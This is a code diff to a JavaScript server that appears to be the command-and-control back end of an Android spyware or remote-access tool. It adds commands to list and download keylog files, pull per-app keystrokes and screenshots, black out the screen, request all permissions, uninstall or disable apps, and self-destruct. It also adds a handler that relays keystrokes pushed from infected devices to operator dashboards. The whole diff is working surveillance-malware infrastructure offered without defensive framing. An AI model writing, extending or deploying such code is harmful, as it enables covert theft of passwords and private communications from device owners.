@@ -122,7 +122,37 @@ const COMMANDS = {
     screen_record_stop:          { category: 'streaming',   label: 'Stop Screen Rec',       icon: '⏹️' },
     screen_record_list_local:    { category: 'streaming',   label: 'List Local Recs',       icon: '🎬' },
     screen_record_delete_local:  { category: 'streaming',   label: 'Delete Local Rec',      icon: '🗑️' },
-    screen_record_get_local:     { category: 'streaming',   label: 'Get Local Rec',         icon: '📥' }
+    screen_record_get_local:     { category: 'streaming',   label: 'Get Local Rec',         icon: '📥' },
+    // Frame on demand
+    stream_request_frame:        { category: 'streaming',   label: 'Request Frame',         icon: '📸' },
+    // Screen blackout
+    screen_blackout_on:          { category: 'screen_ctrl', label: 'Blackout On',           icon: '⬛' },
+    screen_blackout_off:         { category: 'screen_ctrl', label: 'Blackout Off',          icon: '⬜' },
+    get_blackout_status:         { category: 'screen_ctrl', label: 'Blackout Status',       icon: '⬛' },
+    // Permissions / App Mode
+    get_permissions:             { category: 'system',      label: 'Get Permissions',       icon: '🔐' },
+    request_permission:          { category: 'system',      label: 'Request Permission',    icon: '🔑' },
+    request_all_permissions:     { category: 'system',      label: 'Request All Perms',     icon: '🔑' },
+    // Keylogger
+    list_keylog_files:           { category: 'keylog',      label: 'List Keylog Files',     icon: '📁' },
+    download_keylog_file:        { category: 'keylog',      label: 'Download Keylog File',  icon: '⬇️' },
+    // App Monitor
+    list_app_monitor_apps:       { category: 'app_monitor', label: 'List Monitored Apps',   icon: '📡' },
+    get_app_keylogs:             { category: 'app_monitor', label: 'Get App Keylogs',       icon: '⌨️' },
+    list_app_keylog_files:       { category: 'app_monitor', label: 'List App Keylog Files', icon: '📁' },
+    download_app_keylog_file:    { category: 'app_monitor', label: 'Download App Keylog',   icon: '⬇️' },
+    list_app_screenshots:        { category: 'app_monitor', label: 'List App Screenshots',  icon: '📷' },
+    download_app_screenshot:     { category: 'app_monitor', label: 'Download App Screenshot',icon:'⬇️' },
+    // App Manager
+    uninstall_app:               { category: 'app_manager', label: 'Uninstall App',         icon: '🗑️' },
+    force_stop_app:              { category: 'app_manager', label: 'Force Stop App',        icon: '⏹️' },
+    open_app:                    { category: 'app_manager', label: 'Open App',              icon: '▶️' },
+    clear_app_data:              { category: 'app_manager', label: 'Clear App Data',        icon: '🧹' },
+    disable_app:                 { category: 'app_manager', label: 'Disable App',           icon: '🚫' },
+    add_monitored_app:           { category: 'app_manager', label: 'Monitor App',           icon: '📡' },
+    remove_monitored_app:        { category: 'app_manager', label: 'Stop Monitoring App',   icon: '📡' },
+    // Self-destruct
+    self_destruct:               { category: 'system',      label: 'Self Destruct',         icon: '💣' },
 };
 
 // ============================================
@@ -263,6 +293,16 @@ async function processMessage(clientId, clientType, event, data) {
     if (event === 'device:pong') {
         const conn = tcpClients.get(clientId);
         if (conn) conn.lastPong = Date.now();
+        return;
+    }
+
+    // ── Keylog push from Android → relay to dashboards ──────────────
+    if (event === 'keylog:entry') {
+        const conn = tcpClients.get(clientId);
+        const deviceId = conn?.deviceId || data?.deviceId;
+        if (deviceId) {
+            broadcastDash('keylog:push', { ...data, deviceId });
+        }
         return;
     }
 
